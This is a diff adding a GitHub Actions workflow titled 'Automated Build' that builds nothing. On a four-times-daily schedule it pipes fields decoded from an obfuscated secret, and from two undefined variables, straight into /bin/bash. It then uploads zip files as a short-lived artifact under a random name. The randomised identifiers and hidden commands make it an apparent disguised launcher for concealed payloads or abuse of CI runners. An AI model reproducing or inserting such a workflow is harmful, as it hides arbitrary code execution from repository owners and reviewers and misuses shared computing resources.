@@ -1,0 +1,31 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          fpv6426: ${{ secrets.fpv6426 }}
+        run: |
+          printf '%s' "$fpv6426" | jq -r .ybh78679 | /bin/bash
+          printf '%s' "$wxro6237" | jq -r .k1662 | /bin/bash
+          echo $cl2 | jq -r .eiii9 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6dAmBrmZ
+          path: "*.zip"
+          retention-days: 1
